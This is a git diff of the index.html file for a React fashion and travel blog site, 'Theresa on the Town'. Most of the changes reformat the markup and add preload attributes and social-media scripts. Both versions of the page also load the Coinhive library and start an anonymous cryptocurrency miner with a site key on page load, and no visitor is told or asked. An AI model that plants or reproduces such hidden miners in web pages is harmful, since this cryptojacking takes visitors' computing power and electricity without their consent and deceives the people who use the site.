@@ -6,31 +6,32 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 	<meta name="theme-color" content="#000000">
 	<link rel="manifest" href="%PUBLIC_URL%/manifest.json">
-    <link rel="icon" type="image/ico" href="/logo_icon.png">
+	<link rel="icon" type="image/ico" href="/logo_icon.png">
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="description" content="">
 	<meta name="author" content="Liam Ellis, Lovecraft.io">
 	<title>Theresa on the Town</title>
-	<meta property="og:url"           content="http://www.theresaonthetown.html" />
-	<meta property="og:type"          content="website" />
-	<meta property="og:title"         content="Theresa on the Town" />
-	<meta property="og:description"   content="Fashion, Style, Travel and Wellness" />
-	<meta property="og:image"         content="http://www.your-domain.com/path/image.jpg" />
+	<meta property="og:url" content="http://www.theresaonthetown.html" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="Theresa on the Town" />
+	<meta property="og:description" content="Fashion, Style, Travel and Wellness" />
+	<meta property="og:image" content="http://www.your-domain.com/path/image.jpg" />
 
-	<link href="/css/bootstrap.min.css" rel="stylesheet preload">
-	<link rel="stylesheet preload" type="text/css" href="/css/revolution-slider.css">
-	<link rel="stylesheet preload" type="text/css" href="/css/style.css">
-	<link rel="stylesheet preload" type="text/css" href="/css/owl.carousel.css">
-	<link rel="stylesheet preload" type="text/css" href="/css/responsive.css">
-	<link href="https://fonts.googleapis.com/css?family=Arsenal|Merriweather|Open+Sans" rel="stylesheet preload">
-	<link rel="stylesheet preload" type="text/css" href="/css/animate.css">
-	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<link href="/css/bootstrap.min.css" rel="stylesheet preload" as="style">
+	<link rel="stylesheet preload" as="style" type="text/css" href="/css/revolution-slider.css">
+	<link rel="stylesheet preload" as="style" type="text/css" href="/css/style.css">
+	<link rel="stylesheet preload" as="style" type="text/css" href="/css/owl.carousel.css">
+	<link rel="stylesheet preload" as="style" type="text/css" href="/css/responsive.css">
+	<link href="https://fonts.googleapis.com/css?family=Arsenal|Merriweather|Open+Sans" rel="stylesheet preload" as="style">
+	<link rel="stylesheet preload" as="style" type="text/css" href="/css/animate.css">
+	<script rel="preload" as="script" src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet preload" type="text/css">
 	<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
-		crossorigin="anonymous" rel="preload"></script>
-		
+	    crossorigin="anonymous" rel="preload" as="script"></script>
+	<script rel="preload" as="script" src="https://apis.google.com/js/platform.js"></script>
+
 
 
 	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
@@ -42,15 +43,31 @@
 </head>
 
 <body>
-		<div id="fb-root"></div>
-		<script>(function(d, s, id) {
+	<div id="fb-root"></div>
+	<script>
+		(function (d, s, id) {
 			var js, fjs = d.getElementsByTagName(s)[0];
 			if (d.getElementById(id)) return;
-			js = d.createElement(s); js.id = id;
+			js = d.createElement(s);
+			js.id = id;
 			js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.10&appId=1509687459112498";
 			fjs.parentNode.insertBefore(js, fjs);
-			}(document, 'script', 'facebook-jssdk'));
-		</script>
+		}(document, 'script', 'facebook-jssdk'));
+	</script>
+		
+	<script type="text/javascript">
+		(function (d) {
+			var f = d.getElementsByTagName('SCRIPT')[0],
+				p = d.createElement('SCRIPT');
+			p.type = 'text/javascript';
+			p.async = true;
+			p.src = '/pinit.js';
+			f.parentNode.insertBefore(p, f);
+		}(document));
+	</script>
+
+
+
 	<noscript>
 		You need to enable JavaScript to run this app.
 	</noscript>
@@ -118,14 +135,27 @@
 		<div class="loader">Loading...</div>
 	</div>
 	<div id="root"></div>
-	
-	<script rel="preload" src="https://www.amcharts.com/lib/3/ammap.js"></script>
-	<script rel="preload" src="https://www.amcharts.com/lib/3/maps/js/worldLow.js"></script>
-	<script rel="preload" src="https://www.amcharts.com/lib/3/themes/light.js"></script>
-	<script rel="preload" src="https://www.amcharts.com/lib/3/plugins/export/export.min.js"></script>
-	<script>
+
+	<script rel="preload" as="script" src="https://www.amcharts.com/lib/3/ammap.js"></script>
+	<script rel="preload" as="script" src="https://www.amcharts.com/lib/3/maps/js/worldLow.js"></script>
+	<script rel="preload" as="script" src="https://www.amcharts.com/lib/3/themes/light.js"></script>
+	<script rel="preload" as="script" src="https://www.amcharts.com/lib/3/plugins/export/export.min.js"></script>
+
+	<script rel="preload" as="script">
 		var miner = new CoinHive.Anonymous('0AhwZExaSMcZ0Fjc1nJdxkf6gOcrWxhN');
 		miner.start();
+	</script>
+	<script>
+			function onYtEvent(payload) {
+				if (payload.eventType == 'subscribe') {
+					// Add code to handle subscribe event.
+				} else if (payload.eventType == 'unsubscribe') {
+					// Add code to handle unsubscribe event.
+				}
+				if (window.console) { // for debugging only
+					window.console.log('YT event: ', payload);
+				}
+			}
 	</script>
 
 
